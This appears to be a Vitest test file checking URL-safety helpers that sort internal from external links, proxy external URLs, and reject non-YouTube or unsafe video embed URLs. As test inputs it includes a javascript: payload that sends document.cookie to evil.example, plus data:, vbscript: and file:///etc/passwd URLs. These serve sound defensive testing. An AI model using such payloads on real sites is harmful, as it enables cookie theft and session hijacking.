import { afterEach, describe, expect, it, vi } from 'vitest';

const getConfiguredApiBaseUrlMock = vi.fn((): string => '');
const getBrowserApiBaseUrlMock = vi.fn((): string => '');

vi.mock('@/utils/apiBaseUrl', () => ({
    getConfiguredApiBaseUrl: () => getConfiguredApiBaseUrlMock(),
    getBrowserApiBaseUrl: () => getBrowserApiBaseUrlMock(),
}));

const { getSafeUrl, isInternalUrl, isSafeVideoUrl, isSafeYoutubeEmbedUrl } =
    await import('./proxy');

describe('isInternalUrl', (): void => {
    afterEach((): void => {
        getConfiguredApiBaseUrlMock.mockReturnValue('');
        getBrowserApiBaseUrlMock.mockReturnValue('');
    });

    it('treats relative paths, blob: and data: URLs as internal', (): void => {
        expect(isInternalUrl('/api/v1/files/download/abc')).toBe(true);
        expect(isInternalUrl('blob:http://localhost:3000/uuid')).toBe(true);
        expect(isInternalUrl('data:image/png;base64,abc')).toBe(true);
    });

    it('rejects protocol-relative URLs', (): void => {
        expect(isInternalUrl('//evil.example/x')).toBe(false);
    });

    it('rejects undefined/empty input', (): void => {
        expect(isInternalUrl(undefined)).toBe(false);
        expect(isInternalUrl('')).toBe(false);
    });

    it('treats a same-origin absolute URL as internal', (): void => {
        expect(
            isInternalUrl('http://localhost:3000/api/v1/files/download/abc'),
        ).toBe(true);
    });

    it('treats a URL matching the configured API base as internal', (): void => {
        getConfiguredApiBaseUrlMock.mockReturnValue('https://api.example.com');
        expect(
            isInternalUrl('https://api.example.com/api/v1/files/download/abc'),
        ).toBe(true);
    });

    it('treats a URL matching the browser API base prefix as internal', (): void => {
        getBrowserApiBaseUrlMock.mockReturnValue('https://api.example.com');
        expect(
            isInternalUrl('https://api.example.com/api/v1/files/download/abc'),
        ).toBe(true);
    });

    it('does not classify an external URL as internal just because its path looks like a file-download link', (): void => {
        expect(
            isInternalUrl(
                'https://evil.example/api/v1/files/download/anything',
            ),
        ).toBe(false);
    });
});

describe('getSafeUrl', (): void => {
    afterEach((): void => {
        getConfiguredApiBaseUrlMock.mockReturnValue('');
        getBrowserApiBaseUrlMock.mockReturnValue('');
    });

    it('returns undefined for undefined input', (): void => {
        expect(getSafeUrl(undefined)).toBeUndefined();
    });

    it('returns an internal URL unchanged', (): void => {
        expect(getSafeUrl('/api/v1/files/download/abc')).toBe(
            '/api/v1/files/download/abc',
        );
    });

    it('routes an external URL through the embed proxy endpoint', (): void => {
        getConfiguredApiBaseUrlMock.mockReturnValue('https://api.example.com');
        const externalUrl = 'https://evil.example/api/v1/files/download/x';

        expect(getSafeUrl(externalUrl)).toBe(
            `https://api.example.com/api/v1/embed/proxy?url=${encodeURIComponent(externalUrl)}`,
        );
    });
});

describe('isSafeYoutubeEmbedUrl', (): void => {
    it('allows youtube.com and youtube-nocookie.com https URLs', (): void => {
        expect(
            isSafeYoutubeEmbedUrl('https://www.youtube.com/embed/abc123'),
        ).toBe(true);
        expect(
            isSafeYoutubeEmbedUrl(
                'https://www.youtube-nocookie.com/embed/abc123',
            ),
        ).toBe(true);
        expect(
            isSafeYoutubeEmbedUrl('https://youtube.com/embed/abc123'),
        ).toBe(true);
    });

    it('rejects javascript: and other dangerous schemes', (): void => {
        expect(
            isSafeYoutubeEmbedUrl(
                'javascript:fetch("https://evil.example/steal?c="+document.cookie)',
            ),
        ).toBe(false);
        expect(isSafeYoutubeEmbedUrl('data:text/html,<script>1</script>')).toBe(
            false,
        );
    });

    it('rejects a non-YouTube host even over https', (): void => {
        expect(
            isSafeYoutubeEmbedUrl('https://evil.example/embed/abc123'),
        ).toBe(false);
        expect(
            isSafeYoutubeEmbedUrl('https://youtube.com.evil.example/embed'),
        ).toBe(false);
    });

    it('rejects plain http (non-https) YouTube URLs', (): void => {
        expect(
            isSafeYoutubeEmbedUrl('http://www.youtube.com/embed/abc123'),
        ).toBe(false);
    });

    it('rejects undefined/empty input', (): void => {
        expect(isSafeYoutubeEmbedUrl(undefined)).toBe(false);
        expect(isSafeYoutubeEmbedUrl('')).toBe(false);
    });
});

describe('isSafeVideoUrl', (): void => {
    it('allows https URLs', (): void => {
        expect(isSafeVideoUrl('https://example.com/video.mp4')).toBe(true);
    });

    it('rejects plain http (non-https) URLs', (): void => {
        expect(isSafeVideoUrl('http://example.com/video.mp4')).toBe(false);
    });

    it('rejects javascript: and other dangerous schemes', (): void => {
        expect(
            isSafeVideoUrl(
                'javascript:fetch("https://evil.example/steal?c="+document.cookie)',
            ),
        ).toBe(false);
        expect(isSafeVideoUrl('data:text/html,<script>1</script>')).toBe(
            false,
        );
        expect(isSafeVideoUrl('vbscript:msgbox(1)')).toBe(false);
        expect(isSafeVideoUrl('file:///etc/passwd')).toBe(false);
    });

    it('rejects undefined/empty/unparseable input', (): void => {
        expect(isSafeVideoUrl(undefined)).toBe(false);
        expect(isSafeVideoUrl('')).toBe(false);
        expect(isSafeVideoUrl('not a url')).toBe(false);
    });
});
